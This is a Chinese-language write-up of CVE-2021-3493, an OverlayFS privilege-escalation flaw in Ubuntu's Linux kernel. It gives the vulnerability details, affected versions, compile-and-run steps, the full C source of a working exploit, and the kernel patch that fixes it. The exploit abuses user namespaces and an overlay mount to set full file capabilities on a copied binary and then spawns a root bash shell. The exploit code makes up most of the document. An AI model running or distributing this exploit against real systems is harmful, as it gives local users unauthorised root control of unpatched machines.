
# 0X00 漏洞信息
Linux 内核中的 OverlayFS 漏洞允许 Ubuntu下的本地用户获得 root 权限。Linux 内核中 overlayfs 文件系统中的 Ubuntu 特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于 Ubuntu 附带了一个允许非特权的 overlayfs 挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。<br />Linux支持存储在扩展文件属性中的文件功能，它们的工作方式类似于setuid-bit，但粒度更细。在伪代码中设置文件功能的简化过程如下：重要的调用是 cap_convert_nscap，它检查与名称空间相关的权限。如果我们从自己的名称空间和挂载上设置文件功能，就不会有问题，而且我们有权限这样做。但当OverlayFS将此操作转发给底层文件系统时，它只调用 vfs_setxattr，并跳过 cap_convert_nscap 中的检查。这允许在外部命名空间/mount中的文件上设置任意功能，并且在执行过程中应用。在Linux 5.11中，对cap_convert_nscap的调用被移到了vfs_setxattr中，攻击很难实现。


# 0X01 漏洞概述
| 漏洞名称 | Linux kernel权限提升漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2021-3493 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 2021.04.17 |
| 分数 | 7.8 |
| CVSS | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2021-3493](https://nvd.nist.gov/vuln/detail/CVE-2021-3493) |


# 0X02 影响范围
Ubuntu 19.04<br />Ubuntu 20.10<br />Ubuntu 20.04 LTS<br />Ubuntu 18.04 LTS<br />Ubuntu 16.04 LTS<br />Ubuntu 14.04 ESM


# 0X03 环境搭建
**环境**：ubuntu 20.04.1 


# 0X04 代码审计
参考链接：<br />[https://www.freebuf.com/vuls/275787.html](https://www.freebuf.com/vuls/275787.html)
[https://www.anquanke.com/post/id/240030#h2-4](https://www.anquanke.com/post/id/240030#h2-4)


# 0X05 漏洞复现
```python
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```
![image-20211108113145468.png](./assets/1659506995944-3129dc22-1d4e-42ba-83fe-76c41e373e35.png)

# 0X05 EXP
下载地址：[https://github.com/briskets/CVE-2021-3493](https://github.com/briskets/CVE-2021-3493)

exploit.c
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;
    
    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);
    
    char buf[4096];
    ssize_t rd, wr;
    
    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }
        
        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }
    
    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];
    
    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);
    
    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);
    
    uid_t uid = getuid();
    gid_t gid = getgid();
    
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");
    
    xwritefile("/proc/self/setgroups", "deny");
    
    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);
    
    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);
    
    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);
    
    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
    
    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);
    
    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }
    
    pid_t child = fork();
    if (child == -1)
        err(1, "fork");
    
    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }
    
    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}
```


# 0X06 解决方案
补丁将 setxattr() 中的 cap_convert_nscap() 校验函数移动到了 vfs_setxattr() 中，设置任何目录项的 security.capability 扩展属性时，都会进行 user namespace 和 capability 的校验，补丁具体信息如下。
```c
diff --git a/fs/xattr.c b/fs/xattr.c
index cd7a563e8bcd4..fd57153b1f617 100644
--- a/fs/xattr.c
+++ b/fs/xattr.c
@@ -276,8 +276,16 @@ vfs_setxattr(struct dentry *dentry, const char *name, const void *value,
 {
 	struct inode *inode = dentry->d_inode;
 	struct inode *delegated_inode = NULL;
+	const void  *orig_value = value;
 	int error;
 
+	if (size && strcmp(name, XATTR_NAME_CAPS) == 0) {
+		error = cap_convert_nscap(dentry, &value, size);
+		if (error < 0)
+			return error;
+		size = error;
+	}
+
 retry_deleg:
 	inode_lock(inode);
 	error = __vfs_setxattr_locked(dentry, name, value, size, flags,
@@ -289,6 +297,9 @@ retry_deleg:
 		if (!error)
 			goto retry_deleg;
 	}
+	if (value != orig_value)
+		kfree(value);
+
 	return error;
 }
 EXPORT_SYMBOL_GPL(vfs_setxattr);
@@ -537,12 +548,6 @@ setxattr(struct dentry *d, const char __user *name, const void __user *value,
 		if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||
 		    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))
 			posix_acl_fix_xattr_from_user(kvalue, size);
-		else if (strcmp(kname, XATTR_NAME_CAPS) == 0) {
-			error = cap_convert_nscap(d, &kvalue, size);
-			if (error < 0)
-				goto out;
-			size = error;
-		}
 	}
 
 	error = vfs_setxattr(d, kname, kvalue, size, flags);
```
